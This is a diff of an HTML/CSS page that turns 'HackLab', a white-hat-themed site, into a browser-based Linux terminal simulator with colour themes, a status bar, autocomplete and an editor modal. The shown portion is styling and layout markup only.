@@ -1,988 +1,876 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
+<meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>HackLab v4 — Ultimate White Hat Terminal</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<title>HackLab v5 — Linux Terminal Simulator</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
   :root {
-    --bg-0: #03060a;
-    --bg-1: #060a12;
-    --bg-2: #0b111c;
-    --panel: #0e1521;
-    --panel-2: #141d2e;
-    --border: #1a2538;
-    --border-glow: #2dd4bf;
-    --accent: #2dd4bf;
-    --accent-2: #22d3ee;
-    --accent-3: #a855f7;
-    --accent-4: #ec4899;
-    --text: #e6edf7;
-    --text-dim: #7c8aa3;
-    --success: #22c55e;
-    --warning: #f59e0b;
-    --danger: #ef4444;
-    --sidebar-w: 250px;
+    --bg: #0a0e14;
+    --bg-2: #060910;
+    --panel: #0d1319;
+    --border: #1a2332;
+    --text: #c9d1d9;
+    --dim: #6e7681;
+    --green: #7ee787;
+    --cyan: #79c0ff;
+    --yellow: #ffd866;
+    --red: #ff7b72;
+    --purple: #d2a8ff;
+    --orange: #ffa657;
+    --pink: #f778ba;
+    --accent: #58a6ff;
+  }
+
+  /* ===== THEMES ===== */
+  body.theme-dracula {
+    --bg: #282a36; --bg-2: #21222c; --panel: #282a36;
+    --border: #44475a; --text: #f8f8f2; --dim: #6272a4;
+    --green: #50fa7b; --cyan: #8be9fd; --yellow: #f1fa8c;
+    --red: #ff5555; --purple: #bd93f9; --orange: #ffb86c;
+    --pink: #ff79c6; --accent: #bd93f9;
+  }
+  body.theme-nord {
+    --bg: #2e3440; --bg-2: #272c36; --panel: #2e3440;
+    --border: #434c5e; --text: #eceff4; --dim: #7b88a1;
+    --green: #a3be8c; --cyan: #88c0d0; --yellow: #ebcb8b;
+    --red: #bf616a; --purple: #b48ead; --orange: #d08770;
+    --pink: #b48ead; --accent: #88c0d0;
+  }
+  body.theme-solarized {
+    --bg: #002b36; --bg-2: #00212b; --panel: #073642;
+    --border: #0f4c5c; --text: #93a1a1; --dim: #586e75;
+    --green: #859900; --cyan: #2aa198; --yellow: #b58900;
+    --red: #dc322f; --purple: #6c71c4; --orange: #cb4b16;
+    --pink: #d33682; --accent: #268bd2;
+  }
+  body.theme-matrix {
+    --bg: #000000; --bg-2: #000000; --panel: #0a0a0a;
+    --border: #003300; --text: #00ff41; --dim: #008822;
+    --green: #00ff41; --cyan: #00ff88; --yellow: #88ff00;
+    --red: #ff0000; --purple: #00ffaa; --orange: #88ff00;
+    --pink: #00ff41; --accent: #00ff41;
   }
 
   * { box-sizing: border-box; margin: 0; padding: 0; }
 
   html, body {
     height: 100%;
-    background: var(--bg-0);
+    background: var(--bg);
     color: var(--text);
-    font-family: 'Inter', system-ui, sans-serif;
-    overflow: hidden;
-  }
-
-  code, .mono { font-family: 'JetBrains Mono', monospace; }
-
-  /* ============ MATRIX CANVAS (full bg) ============ */
-  #matrix {
-    position: fixed;
-    inset: 0;
-    z-index: 0;
-    opacity: 0.15;
-    pointer-events: none;
-  }
-
-  /* ============ BOOT SCREEN ============ */
-  #boot {
-    position: fixed;
-    inset: 0;
-    background: #000;
-    z-index: 10000;
-    padding: 3rem;
     font-family: 'JetBrains Mono', monospace;
-    font-size: 0.9rem;
-    color: var(--accent);
+    font-size: 14px;
     overflow: hidden;
-    line-height: 1.6;
-    transition: opacity 0.6s;
+    transition: background 0.3s, color 0.3s;
   }
-  #boot.hide { opacity: 0; pointer-events: none; }
 
-  .boot-cursor {
-    display: inline-block;
-    width: 9px; height: 1em;
-    background: var(--accent);
-    vertical-align: text-bottom;
-    animation: blink 0.8s steps(2) infinite;
-  }
-  @keyframes blink { 50% { opacity: 0; } }
-
-  /* ============ LAYOUT ============ */
   .app {
     display: flex;
+    flex-direction: column;
     height: 100vh;
-    position: relative;
-    z-index: 1;
   }
 
-  /* ============ SIDEBAR ============ */
-  .sidebar {
-    width: var(--sidebar-w);
-    background: rgba(6, 10, 18, 0.92);
-    backdrop-filter: blur(20px);
-    border-right: 1px solid var(--border);
-    padding: 1.3rem 0.9rem;
-    display: flex;
-    flex-direction: column;
-    position: relative;
-    transition: transform 0.3s;
-    z-index: 100;
-  }
-  .sidebar::before {
-    content: "";
-    position: absolute;
-    top: 0; right: 0; bottom: 0;
-    width: 1px;
-    background: linear-gradient(180deg, transparent, var(--accent), transparent);
-    opacity: 0.4;
-  }
-
-  .brand {
-    display: flex;
-    align-items: center;
-    gap: 0.7rem;
-    padding: 0.3rem 0.5rem 1.2rem;
-    border-bottom: 1px solid var(--border);
-    margin-bottom: 1rem;
-  }
-
-  .brand-icon {
-    width: 40px; height: 40px;
-    border-radius: 11px;
-    background: linear-gradient(135deg, var(--accent), var(--accent-3));
-    display: grid; place-items: center;
-    font-weight: 900; font-size: 1.15rem;
-    color: #04121a;
-    box-shadow: 0 0 24px rgba(45, 212, 191, 0.55);
-    animation: brandPulse 3s ease-in-out infinite;
-  }
-  @keyframes brandPulse {
-    0%,100% { box-shadow: 0 0 24px rgba(45, 212, 191, 0.55); }
-    50%     { box-shadow: 0 0 40px rgba(168, 85, 247, 0.7); }
-  }
-
-  .brand-text {
-    font-weight: 800;
-    font-size: 1.15rem;
-    letter-spacing: -0.5px;
-    background: linear-gradient(90deg, var(--accent), var(--accent-2));
-    -webkit-background-clip: text;
-    background-clip: text;
-    color: transparent;
-  }
-  .brand-sub {
-    font-size: 0.62rem;
-    color: var(--text-dim);
-    letter-spacing: 2px;
-    text-transform: uppercase;
-  }
-
-  .nav-label {
-    font-size: 0.65rem;
-    text-transform: uppercase;
-    letter-spacing: 2px;
-    color: var(--text-dim);
-    padding: 0.8rem 0.6rem 0.4rem;
-    font-weight: 700;
-  }
-
-  .nav {
-    display: flex;
-    flex-direction: column;
-    gap: 0.15rem;
-    list-style: none;
-    flex: 1;
-    overflow-y: auto;
-  }
-
-  .nav a {
-    display: flex;
-    align-items: center;
-    gap: 0.75rem;
-    padding: 0.6rem 0.75rem;
-    border-radius: 8px;
-    color: var(--text-dim);
-    text-decoration: none;
-    font-size: 0.88rem;
-    font-weight: 500;
-    transition: all 0.2s;
-    border-left: 2px solid transparent;
-  }
-  .nav a:hover {
-    background: var(--panel);
-    color: var(--text);
-    border-left-color: var(--accent);
-    transform: translateX(2px);
-  }
-  .nav a.active {
-    background: linear-gradient(90deg, rgba(45, 212, 191, 0.15), transparent);
-    color: var(--accent);
-    border-left-color: var(--accent);
-  }
-  .nav svg { width: 17px; height: 17px; stroke: currentColor; fill: none; stroke-width: 2; flex-shrink: 0; }
-
-  .sidebar-footer {
-    padding: 0.9rem 0.6rem 0;
-    border-top: 1px solid var(--border);
-    font-size: 0.68rem;
-    color: var(--text-dim);
-    line-height: 1.6;
-  }
-
-  .status-dot {
-    display: inline-block;
-    width: 7px; height: 7px;
-    border-radius: 50%;
-    background: var(--success);
-    box-shadow: 0 0 8px var(--success);
-    margin-right: 0.4rem;
-    animation: pulse 1.8s infinite;
-  }
-  @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
-
-  /* ============ MAIN AREA ============ */
-  .main {
-    flex: 1;
-    display: flex;
-    flex-direction: column;
-    min-width: 0;
-    position: relative;
-  }
-
-  /* ============ TOPBAR ============ */
-  .topbar {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    padding: 0.7rem 1.5rem;
-    border-bottom: 1px solid var(--border);
-    background: rgba(6, 10, 18, 0.85);
-    backdrop-filter: blur(14px);
-  }
-
-  .breadcrumb {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.8rem;
-    color: var(--text-dim);
-  }
-  .breadcrumb strong { color: var(--accent); }
-
-  .topbar-actions {
-    display: flex;
-    gap: 0.5rem;
-    align-items: center;
-  }
-
-  .btn {
-    display: inline-flex;
-    align-items: center;
-    gap: 0.4rem;
-    padding: 0.5rem 0.9rem;
-    border-radius: 8px;
-    font-size: 0.78rem;
-    font-weight: 600;
-    cursor: pointer;
-    border: 1px solid var(--border);
-    background: var(--panel);
-    color: var(--text);
-    text-decoration: none;
-    transition: all 0.2s;
-    font-family: inherit;
-  }
-  .btn:hover { border-color: var(--accent); color: var(--accent); transform: translateY(-1px); }
-
-  .btn-primary {
-    background: linear-gradient(135deg, var(--accent), var(--accent-2));
-    color: #04121a;
-    border: none;
-    box-shadow: 0 0 20px rgba(45, 212, 191, 0.35);
-  }
-  .btn-primary:hover {
-    color: #04121a;
-    box-shadow: 0 0 30px rgba(45, 212, 191, 0.7);
-    transform: translateY(-1px) scale(1.02);
-  }
-
-  .menu-toggle {
-    display: none;
-    background: var(--panel);
-    border: 1px solid var(--border);
-    color: var(--text);
-    padding: 0.5rem;
-    border-radius: 8px;
-    cursor: pointer;
-  }
-
-  /* ============ CONTENT SCROLL ============ */
-  .content {
-    flex: 1;
-    overflow-y: auto;
-    padding: 2.5rem 2.5rem 4rem;
-    scroll-behavior: smooth;
-  }
-
-  /* HERO */
-  .hero {
-    padding: 2rem 0 3rem;
-    max-width: 1000px;
-  }
-
-  .badge {
-    display: inline-flex;
-    align-items: center;
-    gap: 0.5rem;
-    padding: 0.4rem 0.95rem;
-    border-radius: 100px;
-    background: rgba(45, 212, 191, 0.08);
-    border: 1px solid rgba(45, 212, 191, 0.3);
-    color: var(--accent);
-    font-size: 0.72rem;
-    font-weight: 700;
-    margin-bottom: 1.3rem;
-    letter-spacing: 0.5px;
-    text-transform: uppercase;
-  }
-  .badge::before {
-    content: "";
-    width: 6px; height: 6px;
-    border-radius: 50%;
-    background: var(--accent);
-    box-shadow: 0 0 10px var(--accent);
-    animation: pulse 1.5s infinite;
-  }
-
-  .hero h1 {
-    font-size: clamp(2.2rem, 5.5vw, 4rem);
-    font-weight: 900;
-    letter-spacing: -2px;
-    line-height: 1;
-    margin-bottom: 1.2rem;
-    background: linear-gradient(135deg, #fff 0%, var(--accent) 45%, var(--accent-3) 75%, var(--accent-4) 100%);
-    -webkit-background-clip: text;
-    background-clip: text;
-    color: transparent;
-    background-size: 200% 200%;
-    animation: gradientShift 6s ease infinite;
-  }
-  @keyframes gradientShift {
-    0%,100% { background-position: 0% 50%; }
-    50% { background-position: 100% 50%; }
-  }
-
-  .hero p {
-    font-size: 1.05rem;
-    color: var(--text-dim);
-    max-width: 640px;
-    line-height: 1.7;
-    margin-bottom: 1.8rem;
-  }
-
-  .hero-actions { display: flex; gap: 0.7rem; flex-wrap: wrap; }
-
-  /* STATS */
-  .stats {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-    gap: 1rem;
-    margin-top: 2.5rem;
-  }
-  .stat {
-    padding: 1.2rem;
-    background: var(--panel);
-    border: 1px solid var(--border);
-    border-radius: 12px;
-    transition: all 0.25s;
-    position: relative;
-    overflow: hidden;
-  }
-  .stat::before {
-    content: "";
-    position: absolute;
-    top: 0; left: 0;
-    width: 40%;
-    height: 2px;
-    background: linear-gradient(90deg, var(--accent), transparent);
-  }
-  .stat:hover {
-    border-color: var(--accent);
-    transform: translateY(-4px);
-    box-shadow: 0 15px 40px -15px rgba(45, 212, 191, 0.5);
-  }
-  .stat-num {
-    font-size: 1.7rem;
-    font-weight: 800;
-    background: linear-gradient(135deg, var(--accent), var(--accent-2));
-    -webkit-background-clip: text;
-    background-clip: text;
-    color: transparent;
-    line-height: 1;
-  }
-  .stat-label {
-    font-size: 0.7rem;
-    color: var(--text-dim);
-    margin-top: 0.4rem;
-    text-transform: uppercase;
-    letter-spacing: 1.2px;
-    font-weight: 600;
-  }
-
-  /* SECTION */
-  section.block {
-    padding: 3.5rem 0;
-    border-top: 1px solid var(--border);
-    max-width: 1200px;
-  }
-  .section-tag {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.72rem;
-    color: var(--accent);
-    letter-spacing: 2px;
-    text-transform: uppercase;
-    margin-bottom: 0.6rem;
-    font-weight: 700;
-  }
-  .section-title {
-    font-size: clamp(1.5rem, 3vw, 2.2rem);
-    font-weight: 800;
-    letter-spacing: -1px;
-    margin-bottom: 0.6rem;
-  }
-  .section-desc {
-    color: var(--text-dim);
-    max-width: 620px;
-    line-height: 1.6;
-    margin-bottom: 2rem;
-  }
-
-  /* ============ TERMINAL (Star of the show) ============ */
-  .terminal-wrap {
-    background: rgba(3, 6, 10, 0.95);
-    border: 1px solid var(--border);
-    border-radius: 14px;
-    overflow: hidden;
-    box-shadow: 0 25px 60px -20px rgba(0, 0, 0, 0.9), 0 0 0 1px rgba(45, 212, 191, 0.1);
-    position: relative;
-    backdrop-filter: blur(10px);
-  }
-  .terminal-wrap::after {
-    content: "";
-    position: absolute;
-    inset: 0;
-    background: linear-gradient(180deg, transparent 95%, rgba(45, 212, 191, 0.05));
-    pointer-events: none;
-    animation: scanMove 4s linear infinite;
-  }
-  @keyframes scanMove {
-    0% { transform: translateY(-100%); }
-    100% { transform: translateY(100%); }
-  }
-
-  .term-header {
+  /* ===== TITLE BAR ===== */
+  .titlebar {
     display: flex;
     align-items: center;
     gap: 0.5rem;
-    padding: 0.7rem 1rem;
-    background: rgba(14, 21, 33, 0.9);
+    padding: 0.6rem 1rem;
+    background: var(--panel);
     border-bottom: 1px solid var(--border);
+    user-select: none;
+    flex-shrink: 0;
   }
-  .dot { width: 11px; height: 11px; border-radius: 50%; }
+
+  .dot { width: 12px; height: 12px; border-radius: 50%; }
   .dot.r { background: #ff5f56; }
   .dot.y { background: #ffbd2e; }
   .dot.g { background: #27c93f; }
 
-  .term-title {
-    margin-left: 0.5rem;
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.72rem;
-    color: var(--text-dim);
+  .title {
+    flex: 1;
+    text-align: center;
+    color: var(--dim);
+    font-size: 0.75rem;
+    font-weight: 500;
   }
 
-  .term-status {
-    margin-left: auto;
+  .titlebar-actions {
     display: flex;
-    gap: 0.6rem;
-    font-family: 'JetBrains Mono', monospace;
+    gap: 0.4rem;
+    align-items: center;
+  }
+
+  .tb-btn {
+    background: transparent;
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 0.2rem 0.55rem;
+    border-radius: 5px;
+    font-family: inherit;
     font-size: 0.68rem;
-    color: var(--text-dim);
+    cursor: pointer;
+    transition: 0.15s;
   }
-  .term-status span { display: flex; align-items: center; gap: 0.3rem; }
-  .term-status .live {
-    color: var(--success);
+  .tb-btn:hover { border-color: var(--accent); color: var(--accent); }
+
+  select.tb-btn { padding: 0.2rem 0.4rem; }
+
+  /* ===== TERMINAL ===== */
+  .term-wrap {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+    background: var(--bg);
+    position: relative;
   }
-  .term-status .live::before {
+
+  .term-wrap::after {
     content: "";
-    width: 5px; height: 5px;
-    border-radius: 50%;
-    background: var(--success);
-    box-shadow: 0 0 6px var(--success);
-    animation: pulse 1.5s infinite;
+    position: absolute;
+    inset: 0;
+    background: repeating-linear-gradient(
+      to bottom,
+      rgba(255, 255, 255, 0.015) 0px,
+      rgba(255, 255, 255, 0.015) 1px,
+      transparent 1px,
+      transparent 3px
+    );
+    pointer-events: none;
+    z-index: 5;
   }
 
-  .term-body {
-    padding: 1.2rem 1.4rem;
-    height: 420px;
+  .term {
+    flex: 1;
     overflow-y: auto;
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.85rem;
-    line-height: 1.65;
+    padding: 1rem 1.2rem;
+    line-height: 1.5;
+    white-space: pre-wrap;
+    word-break: break-word;
+    scroll-behavior: smooth;
+    font-size: 0.88rem;
+    position: relative;
+    z-index: 6;
   }
-  .term-body::-webkit-scrollbar { width: 8px; }
-  .term-body::-webkit-scrollbar-track { background: var(--bg-0); }
-  .term-body::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
-  .term-body::-webkit-scrollbar-thumb:hover { background: var(--accent); }
 
-  .term-body .line { white-space: pre-wrap; word-break: break-word; }
-  .term-body .prompt { color: var(--accent); font-weight: 500; }
-  .term-body .path { color: var(--accent-3); font-weight: 500; }
-  .term-body .out { color: var(--text); }
-  .term-body .err { color: var(--danger); }
-  .term-body .warn { color: var(--warning); }
-  .term-body .ok { color: var(--success); }
-  .term-body .info { color: var(--accent-2); }
-  .term-body .dim { color: var(--text-dim); }
-  .term-body .purple { color: var(--accent-3); }
+  .term::-webkit-scrollbar { width: 10px; }
+  .term::-webkit-scrollbar-track { background: var(--bg); }
+  .term::-webkit-scrollbar-thumb { background: var(--border); border-radius: 5px; }
+  .term::-webkit-scrollbar-thumb:hover { background: var(--accent); }
 
-  .term-input-line {
+  .line { white-space: pre-wrap; word-break: break-word; margin-bottom: 1px; }
+
+  /* Colors */
+  .c-text   { color: var(--text); }
+  .c-dim    { color: var(--dim); }
+  .c-green  { color: var(--green); }
+  .c-cyan   { color: var(--cyan); }
+  .c-yellow { color: var(--yellow); }
+  .c-red    { color: var(--red); }
+  .c-purple { color: var(--purple); }
+  .c-orange { color: var(--orange); }
+  .c-pink   { color: var(--pink); }
+  .c-accent { color: var(--accent); }
+  .bold { font-weight: 700; }
+
+  /* Prompt colors */
+  .p-user { color: var(--green); }
+  .p-host { color: var(--cyan); }
+  .p-path { color: var(--purple); }
+  .p-sym  { color: var(--dim); }
+  .p-root-user { color: var(--red); font-weight: 700; }
+  .p-root-sym  { color: var(--red); font-weight: 700; }
+
+  /* Input line */
+  .input-line {
     display: flex;
     align-items: center;
-    gap: 0.5rem;
-    padding: 0.7rem 1.4rem 0.9rem;
-    background: rgba(14, 21, 33, 0.85);
+    padding: 0.5rem 1.2rem 0.8rem;
+    background: var(--bg-2);
     border-top: 1px solid var(--border);
-    font-family: 'JetBrains Mono', monospace;
+    flex-shrink: 0;
+    z-index: 10;
+    position: relative;
   }
-  .term-input-line .p { color: var(--accent); font-weight: 500; font-size: 0.85rem; }
-  .term-input-line .p .path { color: var(--accent-3); }
 
-  #cmdInput {
+  .input-line .prompt {
+    margin-right: 0.5rem;
+    white-space: nowrap;
+    font-size: 0.88rem;
+    font-weight: 500;
+  }
+
+  #cmd {
     flex: 1;
     background: transparent;
     border: none;
     outline: none;
     color: var(--text);
     font-family: inherit;
-    font-size: 0.85rem;
-    caret-color: var(--accent);
+    font-size: 0.88rem;
+    caret-color: var(--green);
   }
 
-  .term-hints {
-    display: flex;
-    gap: 0.5rem;
-    padding: 0.5rem 1.4rem 0.7rem;
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.68rem;
-    color: var(--text-dim);
-    background: rgba(14, 21, 33, 0.85);
-    border-top: 1px solid var(--border);
-    flex-wrap: wrap;
-  }
-  .term-hints span {
-    padding: 0.15rem 0.5rem;
-    border: 1px solid var(--border);
-    border-radius: 4px;
-    background: var(--bg-0);
+  #cmd::placeholder { color: var(--dim); opacity: 0.5; }
+
+  /* ===== ASCII banner ===== */
+  .ascii {
+    color: var(--green);
+    font-size: 0.65rem;
+    line-height: 1.05;
+    font-weight: 500;
   }
 
-  /* ============ CARDS ============ */
-  .grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
-    gap: 1.2rem;
+  /* ===== Autocomplete dropdown ===== */
+  .autocomplete {
+    position: absolute;
+    bottom: 100%;
+    left: 1.2rem;
+    background: var(--panel);
+    border: 1px solid var(--accent);
+    border-radius: 8px;
+    padding: 0.4rem;
+    display: none;
+    flex-direction: column;
+    gap: 0.15rem;
+    min-width: 200px;
+    max-height: 240px;
+    overflow-y: auto;
+    box-shadow: 0 -10px 30px rgba(0,0,0,0.6);
+    z-index: 100;
   }
-  .card {
-    background: linear-gradient(180deg, var(--panel), var(--bg-2));
-    border: 1px solid var(--border);
-    border-radius: 14px;
-    padding: 1.4rem;
-    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-    position: relative;
-    overflow: hidden;
+
+  .autocomplete.show { display: flex; }
+
+  .autocomplete .item {
+    padding: 0.3rem 0.6rem;
+    border-radius: 5px;
+    font-size: 0.82rem;
+    color: var(--text);
     cursor: pointer;
   }
-  .card::after {
-    content: "";
-    position: absolute;
-    inset: 0;
-    background: radial-gradient(circle at top right, rgba(45, 212, 191, 0.15), transparent 60%);
-    opacity: 0;
-    transition: opacity 0.3s;
-    pointer-events: none;
+  .autocomplete .item.active,
+  .autocomplete .item:hover {
+    background: var(--accent);
+    color: var(--bg);
   }
-  .card:hover {
-    transform: translateY(-5px);
-    border-color: var(--accent);
-    box-shadow: 0 20px 40px -20px rgba(45, 212, 191, 0.5);
-  }
-  .card:hover::after { opacity: 1; }
 
-  .card-icon {
-    width: 44px; height: 44px;
-    border-radius: 11px;
-    background: linear-gradient(135deg, rgba(45, 212, 191, 0.15), rgba(168, 85, 247, 0.15));
-    border: 1px solid var(--border);
-    display: grid; place-items: center;
-    margin-bottom: 1rem;
-    font-size: 1.3rem;
-  }
-  .card h3 { font-size: 1.02rem; font-weight: 700; margin-bottom: 0.5rem; }
-  .card p { font-size: 0.86rem; line-height: 1.55; color: var(--text-dim); margin-bottom: 1rem; }
-
-  .pill {
-    display: inline-block;
-    padding: 0.25rem 0.65rem;
-    font-size: 0.65rem;
-    font-weight: 700;
-    letter-spacing: 0.5px;
-    text-transform: uppercase;
-    border-radius: 100px;
-    background: rgba(45, 212, 191, 0.1);
-    color: var(--accent);
-    border: 1px solid rgba(45, 212, 191, 0.3);
-  }
-  .pill.purple { background: rgba(168, 85, 247, 0.1); color: var(--accent-3); border-color: rgba(168, 85, 247, 0.35); }
-  .pill.orange { background: rgba(245, 158, 11, 0.1); color: var(--warning); border-color: rgba(245, 158, 11, 0.35); }
-  .pill.blue   { background: rgba(34, 211, 238, 0.1); color: var(--accent-2); border-color: rgba(34, 211, 238, 0.35); }
-  .pill.pink   { background: rgba(236, 72, 153, 0.1); color: var(--accent-4); border-color: rgba(236, 72, 153, 0.35); }
-
-  /* ETHICS */
-  .ethics-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
-    gap: 1rem;
-  }
-  .ethic {
-    background: var(--panel);
-    border: 1px solid var(--border);
-    border-left: 3px solid var(--accent);
-    border-radius: 10px;
-    padding: 1.1rem;
-    transition: 0.25s;
-  }
-  .ethic:hover {
-    background: var(--panel-2);
-    transform: translateX(4px);
-    border-left-color: var(--accent-3);
-  }
-  .ethic .num {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.72rem;
-    color: var(--accent);
-    font-weight: 700;
-    margin-bottom: 0.4rem;
-  }
-  .ethic h4 { font-size: 0.94rem; margin-bottom: 0.35rem; }
-  .ethic p { font-size: 0.8rem; color: var(--text-dim); line-height: 1.5; }
-
-  /* RESOURCES */
-  .resource-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-    gap: 0.75rem;
-  }
-  .resource {
+  /* ===== Status bar ===== */
+  .statusbar {
     display: flex;
-    align-items: center;
     justify-content: space-between;
-    padding: 0.85rem 1rem;
-    background: var(--panel);
-    border: 1px solid var(--border);
-    border-radius: 10px;
-    color: var(--text);
-    text-decoration: none;
-    font-size: 0.85rem;
-    font-weight: 500;
-    transition: 0.2s;
-  }
-  .resource:hover {
-    border-color: var(--accent);
-    background: var(--panel-2);
-    transform: translateY(-2px);
-    color: var(--accent);
-  }
-  .resource .arrow { color: var(--text-dim); transition: 0.2s; }
-  .resource:hover .arrow { color: var(--accent); transform: translateX(3px); }
-
-  /* ============ ACHIEVEMENTS POPUP ============ */
-  .achievement {
-    position: fixed;
-    bottom: 1.5rem;
-    right: 1.5rem;
-    background: linear-gradient(135deg, var(--panel-2), var(--panel));
-    border: 1px solid var(--accent);
-    border-radius: 12px;
-    padding: 1rem 1.2rem;
-    box-shadow: 0 20px 50px -10px rgba(45, 212, 191, 0.6);
-    display: flex;
     align-items: center;
-    gap: 0.8rem;
-    transform: translateX(150%);
-    transition: transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
-    z-index: 5000;
-    max-width: 320px;
-  }
-  .achievement.show { transform: translateX(0); }
-  .achievement .icon {
-    width: 40px; height: 40px;
-    border-radius: 10px;
-    background: linear-gradient(135deg, var(--accent), var(--accent-3));
-    display: grid; place-items: center;
-    font-size: 1.3rem;
+    padding: 0.35rem 1rem;
+    background: var(--panel);
+    border-top: 1px solid var(--border);
+    font-size: 0.72rem;
+    color: var(--dim);
     flex-shrink: 0;
   }
-  .achievement h5 { font-size: 0.7rem; color: var(--accent); letter-spacing: 1.5px; text-transform: uppercase; }
-  .achievement p { font-size: 0.9rem; font-weight: 600; margin-top: 0.15rem; }
 
-  /* ============ OVERLAY (mobile) ============ */
-  .overlay {
-    display: none;
+  .statusbar .left, .statusbar .right {
+    display: flex;
+    gap: 1rem;
+    align-items: center;
+  }
+
+  .statusbar .pill {
+    padding: 0.1rem 0.5rem;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+  }
+
+  .statusbar .pill.live { color: var(--green); border-color: var(--green); }
+  .statusbar .pill.warn { color: var(--yellow); border-color: var(--yellow); }
+
+  .cursor-blink {
+    display: inline-block;
+    width: 8px; height: 1em;
+    background: var(--green);
+    vertical-align: text-bottom;
+    animation: blink 1s steps(2) infinite;
+    margin-left: 1px;
+  }
+  @keyframes blink { 50% { opacity: 0; } }
+
+  /* ===== Modal (vim, nano, etc.) ===== */
+  .modal {
     position: fixed;
     inset: 0;
-    background: rgba(0,0,0,0.7);
-    backdrop-filter: blur(3px);
-    z-index: 99;
+    background: rgba(0, 0, 0, 0.85);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 2000;
+    backdrop-filter: blur(5px);
   }
-  .overlay.show { display: block; }
+  .modal.show { display: flex; }
 
-  /* ============ RESPONSIVE ============ */
-  @media (max-width: 900px) {
-    .sidebar { position: fixed; top: 0; bottom: 0; left: 0; transform: translateX(-100%); box-shadow: 10px 0 40px rgba(0,0,0,0.7); }
-    .sidebar.open { transform: translateX(0); }
-    .menu-toggle { display: grid; place-items: center; }
-    .content { padding: 1.5rem 1.2rem 3rem; }
-    .term-body { height: 340px; font-size: 0.8rem; }
+  .modal-box {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    width: min(800px, 90vw);
+    height: min(500px, 80vh);
+    display: flex;
+    flex-direction: column;
+    box-shadow: 0 30px 80px rgba(0, 0, 0, 0.9);
   }
 
-  @media (max-width: 500px) {
-    .topbar-actions .btn span { display: none; }
-    .hero-actions { flex-direction: column; }
-    .hero-actions .btn { justify-content: center; }
+  .modal-header {
+    padding: 0.7rem 1rem;
+    background: var(--panel);
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    justify-content: space-between;
+    font-size: 0.8rem;
+    color: var(--dim);
+  }
+
+  .modal-body {
+    flex: 1;
+    padding: 1rem;
+    overflow-y: auto;
+  }
+
+  .modal-body textarea {
+    width: 100%;
+    height: 100%;
+    background: transparent;
+    border: none;
+    outline: none;
+    color: var(--text);
+    font-family: inherit;
+    font-size: 0.88rem;
+    resize: none;
+    line-height: 1.5;
+  }
+
+  .modal-footer {
+    padding: 0.5rem 1rem;
+    background: var(--panel);
+    border-top: 1px solid var(--border);
+    font-size: 0.75rem;
+    color: var(--dim);
+    display: flex;
+    justify-content: space-between;
+  }
+
+  /* ===== Mobile ===== */
+  @media (max-width: 700px) {
+    .term { font-size: 0.78rem; padding: 0.7rem; }
+    #cmd { font-size: 0.78rem; }
+    .input-line .prompt { font-size: 0.78rem; }
+    .title { font-size: 0.65rem; }
+    .titlebar-actions .tb-btn span { display: none; }
   }
 </style>
 </head>
-<body>
+<body class="theme-default">
 
-<!-- BOOT SCREEN -->
-<div id="boot">
-  <div id="bootText"></div>
-</div>
+<div class="app">
+  <!-- TITLE BAR -->
+  <div class="titlebar">
+    <span class="dot r"></span>
+    <span class="dot y"></span>
+    <span class="dot g"></span>
+    <div class="title" id="windowTitle">kali@hacklab: ~ — bash — HackLab v5</div>
+    <div class="titlebar-actions">
+      <select class="tb-btn" id="themeSelect" title="Theme">
+        <option value="default">Kali (Dark)</option>
+        <option value="dracula">Dracula</option>
+        <option value="nord">Nord</option>
+        <option value="solarized">Solarized</option>
+        <option value="matrix">Matrix</option>
+      </select>
+      <button class="tb-btn" id="soundBtn" title="Toggle sound">🔊</button>
+      <button class="tb-btn" id="fullBtn" title="Fullscreen">⛶</button>
+    </div>
+  </div>
 
-<!-- MATRIX RAIN -->
-<canvas id="matrix"></canvas>
+  <!-- TERMINAL -->
+  <div class="term-wrap">
+    <div class="term" id="term"></div>
+  </div>
 
-<!-- ACHIEVEMENT POPUP -->
-<div class="achievement" id="achievement">
-  <div class="icon" id="achIcon">🏆</div>
-  <div>
-    <h5>Achievement Unlocked</h5>
-    <p id="achText">Welcome, hacker.</p>
+  <!-- STATUS BAR -->
+  <div class="statusbar">
+    <div class="left">
+      <span class="pill live">● ONLINE</span>
+      <span id="sbUser">kali@hacklab</span>
+      <span id="sbPath">~/</span>
+    </div>
+    <div class="right">
+      <span id="sbCmds">0 cmds</span>
+      <span id="sbClock">--:--:--</span>
+    </div>
+  </div>
+
+  <!-- INPUT -->
+  <div class="input-line">
+    <span class="prompt" id="prompt"></span>
+    <input id="cmd" autocomplete="off" autocapitalize="off" spellcheck="false" placeholder="type 'help' or press Tab..." autofocus />
   </div>
 </div>
 
-<!-- APP -->
-<div class="app">
-
-  <!-- SIDEBAR -->
-  <aside class="sidebar" id="sidebar">
-    <div class="brand">
-      <div class="brand-icon">H</div>
-      <div>
-        <div class="brand-text">HackLab</div>
